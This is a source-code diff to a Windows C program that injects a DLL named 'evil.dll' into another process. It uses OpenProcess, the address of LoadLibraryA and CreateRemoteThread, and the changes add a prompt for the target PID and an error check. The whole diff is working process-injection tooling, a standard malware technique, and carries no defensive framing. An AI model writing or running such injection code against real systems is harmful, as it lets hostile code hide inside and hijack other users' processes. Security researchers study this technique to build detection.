@@ -2,7 +2,7 @@
 #include <windows.h>
 
 
-int ProcessInjection( DWORD PID, SIZE_T SIZE, LPCVOID pBuffer, LPCSTR pDllPath) {
+int ProcessInjection( DWORD PID, SIZE_T SIZE, LPCSTR pDllPath) {
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
 
     if (hProcess == NULL) {
@@ -28,6 +28,11 @@ int ProcessInjection( DWORD PID, SIZE_T SIZE, LPCVOID pBuffer, LPCSTR pDllPath) 
     HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
     FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
 
+    if (pLoadLibrary == NULL) {
+        printf("Failed to get address of LoadLibraryA. Error: %d\n", GetLastError());
+        return 1;
+    }
+
     CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) pLoadLibrary, pBaseAddress, 0 , NULL );
     return 0;
 }
@@ -35,11 +40,14 @@ int ProcessInjection( DWORD PID, SIZE_T SIZE, LPCVOID pBuffer, LPCSTR pDllPath) 
 
 int main() {
 
+
     
-    const char* dllPath = "evil.dll";
 
-    ProcessInjection( 1234, strlen(dllPath) + 1, dllPath, dllPath);
-
-
+    const char* dllPath = ".\\evil.dll";
+    printf("Enter the PID of the target process: ");
+    DWORD PID;
+    scanf("%d", &PID);
+    printf("Attempting to inject DLL into process with PID: %d\n", PID);
+    ProcessInjection( PID, strlen(dllPath) + 1, dllPath);
     return 0;
 }
